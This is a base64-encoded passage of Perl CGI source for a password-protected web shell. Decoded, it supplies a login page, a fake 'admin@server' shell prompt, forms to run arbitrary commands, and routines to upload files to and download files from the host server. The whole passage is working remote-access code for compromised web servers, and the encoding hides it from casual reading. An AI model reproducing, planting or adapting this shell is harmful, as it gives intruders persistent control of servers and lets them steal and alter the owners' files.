0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBHZXRDb29raWVzDQp7DQoJQGh0dHBjb29raWVzID0gc3BsaXQoLzsgLywkRU5WeydIVFRQX0NPT0tJRSd9KTsNCglmb3JlYWNoICRjb29raWUoQGh0dHBjb29raWVzKQ0KCXsNCgkJKCRpZCwgJHZhbCkgPSBzcGxpdCgvPS8sICRjb29raWUpOw0KCQkkQ29va2llc3skaWR9ID0gJHZhbDsNCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgc2NyZWVuIHdoZW4gdGhlIHVzZXIgbG9ncyBvdXQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ291dFNjcmVlbg0Kew0KCXByaW50ICJDb25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIExvZ3Mgb3V0IHRoZSB1c2VyIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gbG9naW4gYWdhaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQZXJmb3JtTG9nb3V0DQp7DQoJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPTtcbiI7ICMgcmVtb3ZlIHBhc3N3b3JkIGNvb2tpZQ0KCSZQcmludFBhZ2VIZWFkZXIoInAiKTsNCgkmUHJpbnRMb2dvdXRTY3JlZW47DQoNCgkmUHJpbnRMb2dpblNjcmVlbjsNCgkmUHJpbnRMb2dpbkZvcm07DQoJJlByaW50UGFnZUZvb3RlcjsNCglleGl0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGxvZ2luIHRoZSB1c2VyLiBJZiB0aGUgcGFzc3dvcmQgbWF0Y2hlcywgaXQNCiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QNCiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyDQojIHRvIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ2luIA0Kew0KCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkDQoJew0KCQlwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9JExvZ2luUGFzc3dvcmQ7XG4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyOw0KCQlwcmludCAmTGlzdERpcjsNCgl9DQoJZWxzZSAjIHBhc3N3b3JkIGRpZG4ndCBtYXRjaA0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCQkmUHJpbnRMb2dpblNjcmVlbjsNCgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZA0KCQl7DQoJCQkmUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2U7DQoNCgkJfQ0KCQkmUHJpbnRMb2dpbkZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCWV4aXQ7DQoJfQ0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBjb21tYW5kcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0NCnsNCgkkRW5jb2RlQ3VycmVudERpciA9IEVuY29kZURpcigkQ3VycmVudERpcik7DQoJbXkgJGRpcj0gIjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+Ii4mQWRkTGlua0RpcigiY29tbWFuZCIpLiI8L3NwYW4+IjsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIjxmb250IGNvbG9yPScjRkZGRkZGJz5bYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQ8L2ZvbnQ+ICI7DQoJcmV0dXJuIDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiIgb25TdWJtaXQ9IkVuY29kZXIoJ2MnKSI+DQoNCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJjb21tYW5kIj4NCg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRFbmNvZGVDdXJyZW50RGlyIj4NCiRQcm9tcHQNCjxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI0MCIgbmFtZT0iYyIgaWQ9ImMiPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCkVORA0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBkb3dubG9hZCBmaWxlcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RmlsZURvd25sb2FkRm9ybQ0Kew0KCSRFbmNvZGVDdXJyZW50RGlyID0gRW5jb2RlRGlyKCRDdXJyZW50RGlyKTsNCglteSAkZGlyID0gJkFkZExpbmtEaXIoImRvd25sb2FkIik7IA0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkICI7DQoJcmV0dXJuIDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEVuY29kZUN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImRvd25sb2FkIj4NCiRQcm9tcHQgZG93bmxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCkRvd25sb2FkOiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KDQo8L2Zvcm0+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byB1cGxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtDQp7DQoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOw0KCW15ICRkaXI9ICZBZGRMaW5rRGlyKCJ1cGxvYWQiKTsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJCAiOw0KCXJldHVybiA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KJFByb21wdCB1cGxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCk9wdGlvbnM6ICZuYnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgaWQ9InVwIiB2YWx1ZT0ib3ZlcndyaXRlIj4NCjxsYWJlbCBmb3I9InVwIj5PdmVyd3JpdGUgaWYgaXQgRXhpc3RzPC9sYWJlbD48YnI+PGJyPg0KVXBsb2FkOiZuYnNwOyZuYnNwOyZuYnNwOzxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEVuY29kZUN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9InVwbG9hZCI+DQo8L2Zvcm0+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVlZCB0bw0KIyB0ZXJtaW5hdGUgdGhlIHNjcmlwdCBpbW1lZGlhdGVseS4gVGhpcyBmdW5jdGlvbiBpcyB2YWxpZCBvbmx5IG9uIFVuaXguIEl0IGlzDQojIG5ldmVyIGNhbGxlZCB3aGVuIHRoZSBzY3JpcHQgaXMgcnVubmluZyBvbiBOVC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBDb21tYW5kVGltZW91dA0Kew0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgkJcmV0dXJuIDw8RU5EOw0KPC90ZXh0YXJlYT4NCjxicj48Zm9udCBjb2xvcj15ZWxsb3c+DQpDb21tYW5kIGV4Y2VlZGVkIG1heGltdW0gdGltZSBvZiAkQ29tbWFuZFRpbWVvdXREdXJhdGlvbiBzZWNvbmQocykuPC9mb250Pg0KPGJyPjxmb250IHNpemU9JzYnIGNvbG9yPXJlZD5LaWxsZWQgaXQhPC9mb250Pg0KRU5EDQoJfQ0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQgY29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcg0KIyB0byBkb3dubG9hZCB0aGUgc3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gNCiMgZmVhdHVyZSB0aGF0IHN0YXJ0cyB0aGUgZG93bmxvYWQgYXV0b21hdGljYWxseS4NCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludERvd25sb2FkTGlua1BhZ2UNCnsNCglsb2NhbCgkRmlsZVVybCkgPSBAXzsNCglteSAkcmVzdWx0PSIiOw0KCWlmKC1lICRGaWxlVXJsKSAjIGlmIHRoZSBmaWxlIGV4aXN0cw0KCXsNCgkJIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3Nlcg0KCQkkRmlsZVVybCA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQoJCSREb3dubG9hZExpbmsgPSAiJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZj0kRmlsZVVybCZvPWdvIjsNCgkJJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsNCgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkkcmVzdWx0IC49IDw8RU5EOw0KU2VuZGluZyBGaWxlICRUcmFuc2ZlckZpbGUuLi48YnI+DQoNCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LA0KPGEgaHJlZj0iJERvd25sb2FkTGluayI+Q2xpY2sgSGVyZTwvYT4NCkVORA0KCQkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCX0NCgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0DQoJew0KCQkkcmVzdWx0IC49ICJGYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhIjsNCgkJJHJlc3VsdCAuPSAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlDQojIGJyb3dzZXIsIHNvIHRoYXQgaXQgY2FuIGJlIGRvd25sb2FkZWQgYnkgdGhlIHVzZXIuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBzZW50Lg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyDQp7DQoJbXkgJHJlc3VsdCA9ICIiOw0KCWxvY2FsKCRTZW5kRmlsZSkgPSBAXzsNCglpZihvcGVuKFNFTkRGSUxFLCAkU2VuZEZpbGUpKSAjIGZpbGUgb3BlbmVkIGZvciByZWFkaW5nDQoJew0KCQlpZigkV2luTlQpDQoJCXsNCgkJCWJpbm1vZGUoU0VOREZJTEUpOw0KCQkJYmlubW9kZShTVERPVVQpOw0KCQl9DQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOw0KCQkoJEZpbGVuYW1lID0gJFNlbmRGaWxlKSA9fiAgbSEoW14vXlxcXSopJCE7DQoJCXByaW50ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtdW5rbm93blxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7DQoJCXByaW50ICJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kMVxuXG4iOw0KCQlwcmludCB3aGlsZSg8U0VOREZJTEU+KTsNCgkJY2xvc2UoU0VOREZJTEUpOw0KCQlleGl0KDEpOw0KCX0NCgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQ0KCXsNCgkJJHJlc3VsdCAuPSAiRmFpbGVkIHRvIGRvd25sb2FkICRTZW5kRmlsZTogJCEiOw0KCQkkcmVzdWx0IC49JlByaW50RmlsZURvd25sb2FkRm9ybTsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlDQojIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsgdGhyb3VnaCB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMgVGhpcyBmdW5jdGlvbiBpcyBhbHNvIGNhbGxlZCB3aGVuIHRoZSB1c2VyIGNsaWNrcyBvbiB0aGF0IGxpbmsuIEluIHRoaXMgY2FzZSwNCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCZWdpbkRvd25sb2FkDQp7DQoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOw0KCSMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwNCgkJKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQoJew0KCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQoJfQ0KCWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQoJew0KCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCQkkVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCX0NCg0KCWlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQoJew0KCQkmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KCX0NCgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0KCXsNCgkJJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZS4gSWYgdGhlDQojIGZpbGUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQ0KIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBVcGxvYWRGaWxlDQp7DQoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluDQoJaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikNCgl7DQoJCXJldHVybiAmUHJpbnRGaWxlVXBsb2FkRm9ybTsNCg0KCX0NCglteSAkcmVzdWx0PSIiOw0KCSMgc3RhcnQgdGhlIHVwbG9hZGluZyBwcm9jZXNzDQoJJHJlc3VsdCAuPSAiVXBsb2FkaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsNCg0KCSMgZ2V0IHRoZSBmdWxsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQNCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkkVHJhbnNmZXJGaWxlID1+IG0hKFteL15cXF0qKSQhOw0KCSRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQxOw0KDQoJJFRhcmdldEZpbGVTaXplID0gbGVuZ3RoKCRpbnsnZmlsZWRhdGEnfSk7DQoJIyBpZiB0aGUgZmlsZSBleGlzdHMgYW5kIHdlIGFyZSBub3Qgc3VwcG9zZWQgdG8gb3ZlcndyaXRlIGl0DQoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpDQoJew0KCQkkcmVzdWx0IC49ICJGYWlsZWQ6IERlc3RpbmF0aW9uIGZpbGUgYWxyZWFkeSBleGlzdHMuPGJyPiI7DQoJfQ0KCWVsc2UgIyBmaWxlIGlzIG5vdCBwcmVzZW50DQoJew0KCQlpZihvcGVuKFVQTE9BREZJTEUsICI+JFRhcmdldE5hbWUiKSkNCgkJew0KCQkJYmlubW9kZShVUExPQURGSUxFKSBpZiAkV2luTlQ7DQoJCQlwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsNCgkJCWNsb3NlKFVQTE9BREZJTEUpOw0KCQkJJHJlc3VsdCAuPSAiVHJhbnNmZXJlZCAkVGFyZ2V0RmlsZVNpemUgQnl0ZXMuPGJyPiI7DQoJCQkkcmVzdWx0IC49ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7DQoJCX0NCgkJZWxzZQ0KCQl7DQoJCQkkcmVzdWx0IC49ICJGYWlsZWQ6ICQhPGJyPiI7DQoJCX0NCgl9DQoJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlbmFtZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluaw0KIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBEb3dubG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCXJldHVybiAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCg0KCSMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwgKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQoJew0KCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQoJfQ0KCWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQoJew0KCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCQkkVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCX0NCg0KCWlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQoJew0KCQlyZXR1cm4gJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCgl9DQoJZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCgl7DQoJCXJldHVybiAmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGV4ZWN1dGUgY29tbWFuZHMuIEl0IGRpc3BsYXlzIHRoZSBvdXRwdXQgb2YgdGhlDQojIGNvbW1hbmQgYW5kIGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBhbm90aGVyIGNvbW1hbmQuIFRoZSBjaGFuZ2UgZGlyZWN0b3J5DQojIGNvbW1hbmQgaXMgaGFuZGxlZCBkaWZmZXJlbnRseS4gSW4gdGhpcyBjYXNlLCB0aGUgbmV3IGRpcmVjdG9yeSBpcyBzdG9yZWQgaW4NCiMgYW4gaW50ZXJuYWwgdmFyaWFibGUgYW5kIGlzIHVzZWQgZWFjaCB0aW1lIGEgY29tbWFuZCBoYXMgdG8gYmUgZXhlY3V0ZWQuIFRoZQ0KIyBvdXRwdXQgb2YgdGhlIGNoYW5nZSBkaXJlY3RvcnkgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkIHRvIHRoZSB1c2Vycw0KIyB0aGVyZWZvcmUgZXJyb3IgbWVzc2FnZXMgY2Fubm90IGJlIGRpc3BsYXllZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBFeGVjdXRlQ29tbWFuZA0Kew0KCSRDdXJyZW50RGlyID0gJlRyaW1TbGFzaGVzKCRDdXJyZW50RGlyKTsNCglteSAkcmVzdWx0PSIiOw0KCWlmKCRSdW5Db21tYW5kID1+IG0vXlxzKmNkXHMrKC4rKS8pICMgaXQgaXMgYSBjaGFuZ2UgZGlyIGNvbW1hbmQNCgl7DQoJCSMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUNCgkJIyBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQuDQoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4iY2Qg